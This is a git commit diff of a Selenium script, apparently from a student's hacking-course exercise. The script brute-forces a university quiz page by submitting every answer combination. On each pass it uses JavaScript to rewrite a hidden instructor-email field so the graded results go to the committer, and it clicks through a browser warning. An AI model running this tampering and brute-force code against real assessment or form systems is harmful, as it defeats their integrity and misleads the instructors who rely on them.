bf2940270a5a81a2d834858a180440d008a9c847
cali-kennedy <calikennedy81@gmail.com>
2024-09-07 21:25:14 -0500

    Now able to loop through combinations and submit quiz

--- hackingQuizOne.py
+++ hackingQuizOne.py
@@ -8,20 +8,7 @@ import time
 # Set up the web driver
 driver = webdriver.Chrome(executable_path='C:\\Users\\calik\\IdeaProjects\\Hacking_Quiz_1\\chromedriver.exe')
 
-# Open the Quiz Page
-driver.get("https://faculty.uca.edu/vparuchuri/4315/4315_quiz1.htm")
 
-# Wait for the page to load
-time.sleep(3)  # Adjust as necessary
-
-# Enter Name, ID, and Email
-driver.find_element_by_name('student_name').send_keys('test')
-driver.find_element_by_name("student_id").send_keys('1234567')
-driver.find_element_by_name('student_email').send_keys('test@test.com')
-
-# Bypass Selenium rules by using JavaScript to modify the hidden input field
-email_js = "document.getElementsByName('instructor_email')[0].setAttribute('value', 'calikennedy81@gmail.com');"
-driver.execute_script(email_js)
 
 # Create A dictionary of question/answer combos
 answer_choices = {
@@ -43,13 +30,63 @@ all_combinations = list(product(answer_choices['q1'], answer_choices['q2'], answ
                                 answer_choices['q10']))
 
 # Make sure combination list generated as expected
-print("Number of Observations:", len(all_combinations))
+print("Number of Combinations:", len(all_combinations))
 
 for combination in all_combinations:
+    # Open the Quiz Page
+    driver.get("https://faculty.uca.edu/vparuchuri/4315/4315_quiz1.htm")
+
+    # Wait for the page to load
+    time.sleep(3)  # Adjust as necessary
+
+    # Enter Name, ID, and Email
+    driver.find_element_by_name('student_name').send_keys('test')
+    driver.find_element_by_name("student_id").send_keys('1234567')
+    driver.find_element_by_name('student_email').send_keys('test@test.com')
+
+    # Bypass Selenium rules by using JavaScript to modify the hidden input field
+    email_js = "document.getElementsByName('instructor_email')[0].setAttribute('value', 'calikennedy81@gmail.com');"
+    driver.execute_script(email_js)
+    time.sleep(1)
+
     print(f"Trying combination: {combination}")
 
     # Use a select object to Handle drop down menus
     q1_dropdown = Select(driver.find_element_by_name('TF:1'))
     q1_dropdown.select_by_visible_text(combination[0])
-    time.sleep(120)
+
+    q2_dropdown = Select(driver.find_element_by_name('TF:2'))
+    q2_dropdown.select_by_visible_text(combination[1])
+
+    q3_dropdown = Select(driver.find_element_by_name('MC:3'))
+    q3_dropdown.select_by_visible_text(combination[2])
+
+    q4_dropdown = Select(driver.find_element_by_name('MC:4'))
+    q4_dropdown.select_by_visible_text(combination[3])
+
+    q5_dropdown = Select(driver.find_element_by_name('MC:5'))
+    q5_dropdown.select_by_visible_text(combination[4])
+
+    q6_dropdown = Select(driver.find_element_by_name('MC:6'))
+    q6_dropdown.select_by_visible_text(combination[5])
+
+    q7_dropdown = Select(driver.find_element_by_name('MC:7'))
+    q7_dropdown.select_by_visible_text(combination[6])
+
+    q8_dropdown = Select(driver.find_element_by_name('MC:8'))
+    q8_dropdown.select_by_visible_text(combination[7])
+
+    q9_dropdown = Select(driver.find_element_by_name('MC:9'))
+    q9_dropdown.select_by_visible_text(combination[8])
+
+    q10_dropdown = Select(driver.find_element_by_name('MC:10'))
+    q10_dropdown.select_by_visible_text(combination[9])
+
+    driver.find_element_by_xpath("//input[@alt='Grade and Submit']").click()
+    time.sleep(5)
+    # Use JavaScript to click the button
+    send_anyway_button = driver.find_element_by_id("proceed-button")
+    driver.execute_script("arguments[0].click();", send_anyway_button)
+    time.sleep(4)
+
 
